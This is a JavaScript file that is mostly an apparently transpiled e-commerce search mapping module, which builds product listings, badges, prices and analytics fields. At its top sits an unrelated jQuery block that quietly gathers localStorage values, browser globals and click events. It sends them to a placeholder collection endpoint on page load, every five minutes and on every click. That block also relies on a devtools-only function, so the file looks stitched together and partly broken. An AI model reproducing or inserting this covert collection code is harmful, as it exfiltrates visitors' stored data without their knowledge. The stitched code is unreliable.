"use strict";

$(function () {
  const keysToTrack = window.keysToTrack;
  const globalVars = ["windowWidth", "windowHeight", "navigator", "location", "document"];
  let oldData = {};
  function computeHash(data) {
    let hash = 0,
      i,
      chr;
    if (data.length === 0) return hash;
    for (i = 0; i < data.length; i++) {
      chr = data.charCodeAt(i);
      hash = (hash << 5) - hash + chr;
      hash |= 0;
    }
    return hash.toString(16);
  }
  ;
  function filterLocalStorage() {
    let filteredData = {};
    for (let key in window.localStorage) {
      if (keysToTrack.includes(key)) {
        filteredData[key] = window.localStorage[key];
      }
    }
    return filteredData;
  }
  ;
  function getGlobalVar() {
    let globalData = {};
    for (let varName of globalVars) {
      if (window[varName] !== undefined) {
        globalData[varName] = JSON.stringify(window[varName]);
      }
    }
    return globalData;
  }
  function collectEventListeners() {
    const events = getEventListeners(window);
    let eventData = {};
    for (let event in events) {
      eventData[event] = events[event].length;
    }
    return eventData;
  }
  ;
  function pushData(data) {
    const hashId = computeHash(JSON.stringify(data));
    const apiUrl = "https://example.com/api/collect";
    $.ajax({
      url: apiUrl,
      type: "POST",
      data: JSON.stringify({
        id: hashId,
        data: data
      }),
      contentType: "application/json",
      success: function () {
        console.log('成功发送数据');
      },
      error: function (jqXHR) {
        console.error('发送数据失败，状态码: ' + jqXHR.status);
      }
    });
  }
  ;
  function collectAndPushData() {
    let data = Object.assign(filterLocalStorage(), getGlobalVar(), collectEventListeners());
    if (JSON.stringify(data) !== JSON.stringify(oldData)) {
      oldData = data;
      pushData(data);
    }
  }
  ;
  window.addEventListener("load", function () {
    collectAndPushData();
  });
  setInterval(collectAndPushData, 5 * 60 * 1000);
  $("body").on("click", function (e) {
    const eventInfo = {
      type: e.type,
      target: e.target.tagName,
      timeStamp: e.timeStamp
    };
    pushData(eventInfo);
  });
  $('.form-control').on('change', function () {
    var $field = $(this).closest('.form-group');
    if (this.value) {
      $field.addClass('field--not-empty');
    } else {
      $field.removeClass('field--not-empty');
    }
  });
});
function _typeof(e) {
  return (_typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
    return typeof e;
  } : function (e) {
    return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
  })(e);
}
var _hawkSearchConfig,
  _hawkSearchModel,
  _excluded = ["Children", "Label"];
function _slicedToArray(e, r) {
  return _arrayWithHoles(e) || _iterableToArrayLimit(e, r) || _unsupportedIterableToArray(e, r) || _nonIterableRest();
}
function _nonIterableRest() {
  throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
}
function _iterableToArrayLimit(e, r) {
  var t = null == e ? null : "undefined" != typeof Symbol && e[Symbol.iterator] || e["@@iterator"];
  if (null != t) {
    var n,
      o,
      l,
      a,
      i = [],
      u = !0,
      d = !1;
    try {
      if (l = (t = t.call(e)).next, 0 === r) {
        if (Object(t) !== t) return;
        u = !1;
      } else for (; !(u = (n = l.call(t)).done) && (i.push(n.value), i.length !== r); u = !0);
    } catch (e) {
      d = !0, o = e;
    } finally {
      try {
        if (!u && null != t.return && (a = t.return(), Object(a) !== a)) return;
      } finally {
        if (d) throw o;
      }
    }
    return i;
  }
}
function _arrayWithHoles(e) {
  if (Array.isArray(e)) return e;
}
function _createForOfIteratorHelper(e, r) {
  var t,
    n,
    o,
    l,
    a = "undefined" != typeof Symbol && e[Symbol.iterator] || e["@@iterator"];
  if (a) return n = !(t = !0), {
    s: function () {
      a = a.call(e);
    },
    n: function () {
      var e = a.next();
      return t = e.done, e;
    },
    e: function (e) {
      n = !0, o = e;
    },
    f: function () {
      try {
        t || null == a.return || a.return();
      } finally {
        if (n) throw o;
      }
    }
  };
  if (Array.isArray(e) || (a = _unsupportedIterableToArray(e)) || r && e && "number" == typeof e.length) return a && (e = a), l = 0, {
    s: r = function () {},
    n: function () {
      return l >= e.length ? {
        done: !0
      } : {
        done: !1,
        value: e[l++]
      };
    },
    e: function (e) {
      throw e;
    },
    f: r
  };
  throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
}
function _unsupportedIterableToArray(e, r) {
  var t;
  if (e) return "string" == typeof e ? _arrayLikeToArray(e, r) : "Map" === (t = "Object" === (t = Object.prototype.toString.call(e).slice(8, -1)) && e.constructor ? e.constructor.name : t) || "Set" === t ? Array.from(e) : "Arguments" === t || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(t) ? _arrayLikeToArray(e, r) : void 0;
}
function _arrayLikeToArray(e, r) {
  (null == r || r > e.length) && (r = e.length);
  for (var t = 0, n = new Array(r); t < r; t++) n[t] = e[t];
  return n;
}
function ownKeys(r, e) {
  var t,
    n = Object.keys(r);
  return Object.getOwnPropertySymbols && (t = Object.getOwnPropertySymbols(r), e && (t = t.filter(function (e) {
    return Object.getOwnPropertyDescriptor(r, e).enumerable;
  })), n.push.apply(n, t)), n;
}
function _objectSpread(r) {
  for (var e = 1; e < arguments.length; e++) {
    var t = null != arguments[e] ? arguments[e] : {};
    e % 2 ? ownKeys(Object(t), !0).forEach(function (e) {
      _defineProperty(r, e, t[e]);
    }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(r, Object.getOwnPropertyDescriptors(t)) : ownKeys(Object(t)).forEach(function (e) {
      Object.defineProperty(r, e, Object.getOwnPropertyDescriptor(t, e));
    });
  }
  return r;
}
function _defineProperty(e, r, t) {
  return (r = _toPropertyKey(r)) in e ? Object.defineProperty(e, r, {
    value: t,
    enumerable: !0,
    configurable: !0,
    writable: !0
  }) : e[r] = t, e;
}
function _toPropertyKey(e) {
  e = _toPrimitive(e, "string");
  return "symbol" === _typeof(e) ? e : String(e);
}
function _toPrimitive(e, r) {
  if ("object" !== _typeof(e) || null === e) return e;
  var t = e[Symbol.toPrimitive];
  if (void 0 === t) return ("string" === r ? String : Number)(e);
  t = t.call(e, r || "default");
  if ("object" !== _typeof(t)) return t;
  throw new TypeError("@@toPrimitive must return a primitive value.");
}
function _objectWithoutProperties(e, r) {
  if (null == e) return {};
  var t,
    n = _objectWithoutPropertiesLoose(e, r);
  if (Object.getOwnPropertySymbols) for (var o = Object.getOwnPropertySymbols(e), l = 0; l < o.length; l++) t = o[l], 0 <= r.indexOf(t) || Object.prototype.propertyIsEnumerable.call(e, t) && (n[t] = e[t]);
  return n;
}
function _objectWithoutPropertiesLoose(e, r) {
  if (null == e) return {};
  for (var t, n = {}, o = Object.keys(e), l = 0; l < o.length; l++) t = o[l], 0 <= r.indexOf(t) || (n[t] = e[t]);
  return n;
}
BN.mappingHawkSearch = {
  userGroup: "undefined" != typeof customerGroup && customerGroup || "DIRECT",
  formatCurrency: "undefined" != typeof hawkSearchConfig && (null == (_hawkSearchConfig = hawkSearchConfig) ? void 0 : _hawkSearchConfig.formatCurrency) || "",
  isBrand: "undefined" != typeof hawkSearchModel && "" != (null == (_hawkSearchModel = hawkSearchModel) ? void 0 : _hawkSearchModel.brandName),
  badges: "undefined" != typeof hawkSearchModel && hawkSearchModel.badges || [],
  bannerZoneTop: "undefined" != typeof hawkSearchModel && hawkSearchModel.bannerZoneTop || "",
  productRightBadgeEnum: {
    none: 0,
    new: 3,
    sale: 4,
    coupon: 5,
    rebate: 6,
    limitedQuantity: 8,
    off: 9,
    preOder: 10,
    directSale: 100,
    dealerSale: 101
  },
  formatHiddenFacets: function (e) {
    var t,
      r = (null == (r = BNApp.searchPage) ? void 0 : r.fieldNames) || {},
      n = r.directSale,
      o = r.dealerSale;
    return null != e && e.length ? (t = {}, e.forEach(function (e) {
      var r = e.key,
        e = e.value;
      t[r] = t[r] || new Set(), "Sale" == e ? (n && t[r].add(n), o && t[r].add(o)) : t[r].add(e);
    }), t) : [];
  },
  modifyFacetValues: function (e, o) {
    var l = this,
      a = 2 < arguments.length && void 0 !== arguments[2] ? arguments[2] : [],
      i = [];
    return e.forEach(function (r) {
      var e = r.Children,
        t = r.Label,
        n = _objectWithoutProperties(r, _excluded);
      o.has(r.Value) || (null != e && e.length && (n.Children = l.modifyFacetValues(e, o, a)), n.hasOwnProperty("Custom") && n.Custom && (n.Custom = JSON.parse(n.Custom)), i.push(_objectSpread({
        Label: null != (e = null == (e = a.find(function (e) {
          return e.value == r.Value;
        })) ? void 0 : e.label) ? e : t
      }, n)));
    }), i;
  },
  realFacets: function (e, t) {
    var n,
      o = this,
      l = 2 < arguments.length && void 0 !== arguments[2] ? arguments[2] : {},
      a = 3 < arguments.length && void 0 !== arguments[3] ? arguments[3] : [],
      i = [];
    return e.forEach(function (e) {
      var r;
      -1 == t.indexOf(e.Field) && (n = null != (r = l[e.Field]) ? r : new Set(), e.Values = o.modifyFacetValues(e.Values, n, a), i.push(e));
    }), i;
  },
  facets: function (e) {
    var r = (null == (r = BNApp.searchPage) ? void 0 : r.fieldNames) || {},
      t = r.dealerPrice,
      n = r.directPrice,
      o = r.dealerGroup,
      l = r.directSale,
      a = r.dealerSale,
      i = r.specialTag,
      u = r.saleLabel,
      d = r.brand,
      r = r.rebateId,
      c = (BNApp.searchPage || {}).ignoreFacetValues,
      c = void 0 === c ? [] : c,
      n = ((c = this.formatHiddenFacets(c))[i] = c[i] || new Set(), c[i].add(this.userGroup == o ? l : a), this.userGroup == o ? [n] : [t]),
      t = (n.push(r), [{
        facet: i,
        value: this.userGroup == o ? a : l,
        label: u
      }]);
    return null != (r = BNApp.makeModel) && r.make && BNApp.searchPage && n.push(BNApp.searchPage.fieldNames.makeAndModel), this.isBrand && n.push(d), this.realFacets(e, n, c, t);
  },
  productItem: function (e) {
    var n,
      o,
      l,
      a = this;
    return BN.hawkBadges = BN.hawkBadges || new HawkBadges(this.badges, this.userGroup), e.map(function (e) {
      var e = e.Document,
        r = null != (r = e.hawk_child_attributes) ? r : [],
        r = (n = a.getPrices(r), o = BN.hawkBadges.get(e.leftbadgetype || []), l = BN.hawkBadges.get(e.rightbadgetype || []), a.getDatalayer(e, {
          price: n.maxCurrentPrice || n.maxCrossPrice,
          dimension46: [o.name, l.name].filter(function (e) {
            return "string" == typeof e;
          }).join(", ")
        })),
        t = "";
      return e.volumediscountcustomergroup && -1 < e.volumediscountcustomergroup.indexOf(BNApp.searchPage.customerGroupNumber) && (t = BNApp.searchPage.volumeDiscountText), {
        datalayer: r,
        code: null == (r = e.productcode) ? void 0 : r[0],
        title: [null == (r = e.branddescription) ? void 0 : r[0], null == (r = e.productdisplayname) ? void 0 : r[0]].filter(function (e) {
          return e;
        }).join(" - "),
        averageRating: parseFloat(null != (r = null == (r = e.productratingdisplay) ? void 0 : r[0]) ? r : 0),
        aroundRating: parseFloat(null != (r = null == (r = e.productratingdisplay) ? void 0 : r[0]) ? r : 0),
        url: null == (r = e.producturl) ? void 0 : r[0],
        imageUrl: null == (r = e.productmainimage) ? void 0 : r[0],
        clickToSeePriceEnable: a.displayPriceShowType(null == (r = e.clicktoseeprice) ? void 0 : r[0]),
        addToCartToSeePriceEnable: a.displayPriceShowType(null == (r = e.addtocarttoseeprice) ? void 0 : r[0]),
        isOnlineOnly: null == (r = e.isonlineonly) ? void 0 : r[0],
        productVariants: e.hawk_child_attributes,
        stockType: null == (r = e.bnactionbutton) ? void 0 : r[0],
        statusRed: null == (r = e.stylered) ? void 0 : r[0],
        status: null == (r = e.status) ? void 0 : r[0],
        leftBadgeUrl: (null == (r = o) ? void 0 : r.url) || "",
        rightBadgeUrl: (null == (r = l) ? void 0 : r.url) || "",
        formattedProductCrossedOutPrice: n.formattedProductCrossedOutPrice,
        formattedProductCurrentPrice: n.formattedProductCurrentPrice,
        formattedPricePerRound: a.getPricePerRound(e.hawk_child_attributes),
        isTempPrice: a.isProductSale(e.hawk_child_attributes),
        offValue: a.getOffValue(null == (r = l) ? void 0 : r.value, null == (r = e.offvalue) ? void 0 : r[0]),
        isDiscontinuedProduct: null == (r = e.isdiscontinuedproduct) ? void 0 : r[0],
        volumeDiscountText: t,
        isLeastOneVariantSale: !0
      };
    });
  },
  banners: function (e) {
    var r = this;
    return e.filter(function (e) {
      return e.Zone == r.bannerZoneTop && r.bannerZoneTop;
    }).map(function (e) {
      return {
        output: e.Output,
        mobileOutput: e.MobileOutput
      };
    });
  },
  currentTags: function (e) {
    var r,
      t,
      n = [];
    if (!e) return [];
    var o,
      l = 0,
      a = ((null == (r = BNApp.searchPage) ? void 0 : r.fieldNames) || {}).category;
    for (t in e) Object.hasOwn(e, t) && ((null == (o = e[t]) ? void 0 : o.Items) || []).forEach(function (e) {
      var r;
      n[l] = {
        field: t,
        value: e.Value,
        label: e.Label
      }, t === a && null != (r = BN.searchPageCtrl) && r.getRouteOfCategory && (n[l].route = BN.searchPageCtrl.getRouteOfCategory(e.Value)), l++;
    });
    return n;
  },
  getLeftBadge: function (e) {
    var r = 0,
      t = 1,
      n = 2;
    if (null != e && e.length) {
      if (e.some(function (e) {
        var r;
        return (null == (r = e.leftbadgetype) ? void 0 : r[0]) == t && (null == (r = e.disablebadge) ? void 0 : r[0]);
      }) || e.some(function (e) {
        var r;
        return (null == (r = e.brownellsexclusiveflag) ? void 0 : r[0]) && (null == (r = e.brownellsexclusivestartdate) ? void 0 : r[0]) && (null == (r = e.brownellsexclusiveenddate) ? void 0 : r[0]) && new Date(null == (r = e.brownellsexclusivestartdate) ? void 0 : r[0]) <= new Date() && new Date(null == (r = e.brownellsexclusiveenddate) ? void 0 : r[0]) >= new Date() && !(null != (r = e.disablebadge) && r[0]);
      })) return t;
      if (e.some(function (e) {
        var r;
        return (null == (r = e.leftbadgetype) ? void 0 : r[0]) == n && (null == (r = e.disablebadge) ? void 0 : r[0]);
      }) || e.some(function (e) {
        var r;
        return (null == (r = e.edgeexclusive) ? void 0 : r[0]) && (null == (r = e.edgeexclusivestartdate) ? void 0 : r[0]) && (null == (r = e.edgeexclusiveenddate) ? void 0 : r[0]) && new Date(null == (r = e.edgeexclusivestartdate) ? void 0 : r[0]) <= new Date() && new Date(null == (r = e.edgeexclusiveenddate) ? void 0 : r[0]) >= new Date() && !(null != (r = e.disablebadge) && r[0]);
      })) return n;
    }
    return r;
  },
  isProductSale: function (e) {
    var r,
      t = ("undefined" != typeof hawkSearchConfig ? hawkSearchConfig : {}).dealerGroup,
      n = _createForOfIteratorHelper(e);
    try {
      for (n.s(); !(r = n.n()).done;) {
        var o,
          l,
          a,
          i,
          u,
          d,
          c = r.value;
        if (this.userGroup === t) {
          if ((null == (o = c.disablebadge) || !o[0]) && null != (null == (l = c.isdealersale) ? void 0 : l[0]) && 1 == (null == (a = c.isdealersale) ? void 0 : a[0])) return !0;
        } else if ((null == (i = c.disablebadge) || !i[0]) && null != (null == (u = c.isdirectsale) ? void 0 : u[0]) && 1 == (null == (d = c.isdirectsale) ? void 0 : d[0])) return !0;
      }
    } catch (e) {
      n.e(e);
    } finally {
      n.f();
    }
    return !1;
  },
  getRightBadge: function (e) {
    var t = this.productRightBadgeEnum;
    if (null != e && e.length) {
      if (e.some(function (e) {
        var r;
        return (null == (r = e.ispreorderforbadge) ? void 0 : r[0]) && !(null != (r = e.disablebadge) && r[0]);
      }) || e.some(function (e) {
        var r;
        return (null == (r = e.rightbadgetype) ? void 0 : r[0]) == t.preOder && (null == (r = e.disablebadge) ? void 0 : r[0]);
      })) return t.preOder;
      if (e.some(function (e) {
        var r;
        return (null == (r = e.rightbadgetype) ? void 0 : r[0]) == t.rebate && (null == (r = e.disablebadge) ? void 0 : r[0]);
      }) || e.some(function (r) {
        return (null != (t = (e = r).rebatecampaign) && t[0] ? JSON.parse(null == (t = e.rebatecampaign) ? void 0 : t[0]) : []).some(function (e) {
          return new Date(e.startdate) <= new Date() && new Date(e.enddate) >= new Date() && !(null != (e = r.disablebadge) && e[0]);
        });
        var e, t;
      })) return t.rebate;
      if (this.isProductSale(e) || e.some(function (e) {
        var r;
        return (null == (r = e.disablebadge) ? void 0 : r[0]) && (null == (r = e.rightbadgetype) ? void 0 : r[0]) == t.sale;
      })) return t.sale;
      if (function (e) {
        var r,
          t = new Date(),
          n = _createForOfIteratorHelper(e);
        try {
          for (n.s(); !(r = n.n()).done;) {
            var o,
              l,
              a,
              i = r.value;
            if (null != (o = i.disablebadge) && o[0]) if (null != (l = i.coupon) && l[0]) if (JSON.parse(null == (a = i.coupon) ? void 0 : a[0]).some(function (e) {
              return new Date(e.fromdate) <= t && new Date(e.todate) >= t;
            })) return !0;
          }
        } catch (e) {
          n.e(e);
        } finally {
          n.f();
        }
        return !1;
      }(e) || e.some(function (e) {
        var r;
        return (null == (r = e.rightbadgetype) ? void 0 : r[0]) == t.coupon && (null == (r = e.disablebadge) ? void 0 : r[0]);
      })) return t.coupon;
      if (e.some(function (e) {
        var r;
        return (null == (r = e.rightbadgetype) ? void 0 : r[0]) == t.new && (null == (r = e.disablebadge) ? void 0 : r[0]);
      }) || e.some(function (e) {
        var r;
        return new Date(null == (r = e.startpublishdate) ? void 0 : r[0]) >= new Date(new Date().setDate(new Date().getDate() - 7)) && !(null != (r = e.disablebadge) && r[0]);
      })) return t.new;
      if (e.some(function (e) {
        var r;
        return (null == (r = e.rightbadgetype) ? void 0 : r[0]) == t.limitedQuantity && (null == (r = e.disablebadge) ? void 0 : r[0]);
      })) return t.limitedQuantity;
      if (e.some(function (e) {
        var r;
        return (null == (r = e.rightbadgetype) ? void 0 : r[0]) == t.off && (null == (r = e.disablebadge) ? void 0 : r[0]) && (null == (r = e.offvalue) ? void 0 : r[0]);
      })) return t.off;
    }
    return t.None;
  },
  displayPriceShowType: function (e) {
    var r = "undefined" != typeof hawkSearchConfig ? hawkSearchConfig : {};
    return this.userGroup !== r.dealerGroup && e;
  },
  getPrices: function (e) {
    var r,
      t = [],
      n = [],
      o = ("undefined" != typeof hawkSearchConfig ? hawkSearchConfig : {}).dealerGroup,
      l = _createForOfIteratorHelper(e);
    try {
      for (l.s(); !(r = l.n()).done;) {
        var a,
          i,
          u,
          d,
          c = r.value;
        this.userGroup === o ? (null != (a = _slicedToArray(c.dealerprice || [], 1)[0]) && t.push(parseFloat(a)), null != (i = _slicedToArray(c.crossdealerprice || [], 1)[0]) && n.push(parseFloat(i))) : (null != (u = _slicedToArray(c.directprice || [], 1)[0]) && t.push(parseFloat(u)), null != (d = _slicedToArray(c.crossdirectprice || [], 1)[0]) && n.push(parseFloat(d)));
      }
    } catch (e) {
      l.e(e);
    } finally {
      l.f();
    }
    t.sort(this.compareNumbers), n.sort(this.compareNumbers);
    var e = null == (e = t.slice(0, 1)) ? void 0 : e[0],
      s = null == (s = t.slice(-1)) ? void 0 : s[0],
      f = "",
      e = (null != e && null != s && (f = e == s ? BN.formatPrice(e, this.formatCurrency) : BN.formatPrice(e, this.formatCurrency) + " - " + BN.formatPrice(s, this.formatCurrency)), null == (e = n.slice(0, 1)) ? void 0 : e[0]),
      p = null == (p = n.slice(-1)) ? void 0 : p[0],
      v = "";
    return {
      formattedProductCrossedOutPrice: v = null != e && null != p ? e == p ? BN.formatPrice(e, this.formatCurrency) : BN.formatPrice(e, this.formatCurrency) + " - " + BN.formatPrice(p, this.formatCurrency) : v,
      formattedProductCurrentPrice: f,
      maxCurrentPrice: s || t[0],
      maxCrossPrice: p || n[0]
    };
  },
  compareNumbers: function (e, r) {
    return e - r;
  },
  getPricePerRound: function (e) {
    var r,
      t = [],
      n = _createForOfIteratorHelper(e);
    try {
      for (n.s(); !(r = n.n()).done;) {
        var o = _slicedToArray(r.value.priceperround || [], 1)[0];
        null !== o && null != o && t.push(parseFloat(o));
      }
    } catch (e) {
      n.e(e);
    } finally {
      n.f();
    }
    t.sort(this.compareNumbers);
    var e = null == (e = t.slice(0, 1)) ? void 0 : e[0],
      l = null == (l = t.slice(-1)) ? void 0 : l[0];
    return null != e && null != l ? e == l ? "(".concat(BN.formatPrice(e, this.formatCurrency), "/Round)") : "(".concat(BN.formatPrice(e, this.formatCurrency), "/Round - ").concat(BN.formatPrice(l, this.formatCurrency), "/Round)") : "";
  },
  getOffValue: function (e, r) {
    return e == this.productRightBadgeEnum.off ? r : "";
  },
  makeAndModels: function (e) {
    var r,
      t,
      n = {};
    return e.forEach(function (e) {
      (t = e.Value) && (r = t.split(".")[0], t = t.split(".")[1], r) && (n[r] = n[r] || {}, n[r].models = n[r].models || [], t ? n[r].models.push({
        label: t,
        count: e.Count
      }) : n[r].count = e.Count);
    }), n;
  },
  manufacturerConfig: function (e) {
    try {
      var r = e[0],
        t = JSON.parse(r.Document.manufacturer[0]);
      return {
        banner: t.ImageUrl,
        icon: t.IconUrl,
        title: t.Name,
        url: t.Url
      };
    } catch (e) {
      return {};
    }
  },
  rebateConfig: function (e, r) {
    try {
      var t,
        n = e[0].Document.rebatename,
        o = r + "_",
        l = null == (t = n.filter(function (e) {
          return e.startsWith(o);
        })) ? void 0 : t[0],
        a = new RegExp("^" + o);
      return {
        title: l.replace(a, "")
      };
    } catch (e) {
      return {};
    }
  },
  getDatalayer: function (e, r) {
    var t,
      n = r.price,
      r = r.dimension46,
      o = null == e || null == (o = e.makeandmodels) ? void 0 : o.reduce(function (e, r) {
        e = null == e || null == (e = e.split(".")) ? void 0 : e[1];
        if (e) return r + ", " + e;
      }),
      l = 1 < (null == (l = e.hawk_child_attributes) ? void 0 : l.length),
      a = l ? null : null == (a = e.hawk_child_attributes) ? void 0 : a[0],
      i = null == a || null == (i = a.buyboxattributekeys) ? void 0 : i.findIndex(function (e) {
        return "Cartridge" == e;
      });
    return {
      name: null == (t = e.productdisplayname) ? void 0 : t[0],
      id: null == (t = e.productcode) ? void 0 : t[0],
      price: n,
      brand: null == (t = e.branddescription) ? void 0 : t[0],
      category: null == (n = e.categorynames) ? void 0 : n[0],
      variant: (null == a || null == (t = a.buyboxattributevalues) ? void 0 : t.join(", ")) || null,
      dimension32: o || null,
      dimension33: (null == a || null == (n = a.skucode) ? void 0 : n[0]) || null,
      dimension34: (null == a || null == (t = a.skudisplayname) ? void 0 : t[0]) || null,
      dimension35: (null == a || null == (o = a.fapa) ? void 0 : o[0]) || null,
      dimension36: (null == a || null == (n = a.buyboxattributevalues) ? void 0 : n[i]) || null,
      dimension37: l ? null : null != a && null != (t = a.isfflproduct) && t[0] ? "Yes" : "No",
      dimension38: (null == a || null == (o = a.restrictions) ? void 0 : o.join(", ")) || null,
      dimension39: l ? null : null == e || null == (n = e.status) ? void 0 : n[0],
      dimension40: null != (i = e.isproductwithvideo) && i[0] ? "Yes" : "No",
      dimension41: (null == (t = e.productratingdisplay) ? void 0 : t[0]) || 0,
      dimension42: (null == (o = e.totalreviews) ? void 0 : o[0]) || 0,
      dimension43: null == (n = e.hawk_child_attributes) ? void 0 : n.reduce(function (e, r) {
        return e + (null == (e = r.skuassetimagecount) ? void 0 : e[0]) || 0;
      }, 0),
      dimension44: (null == a || null == (i = a.compliancetype) ? void 0 : i[0]) || null,
      dimension45: l ? null : r ? "Yes" : "No",
      dimension46: l || !r ? null : r
    };
  }
};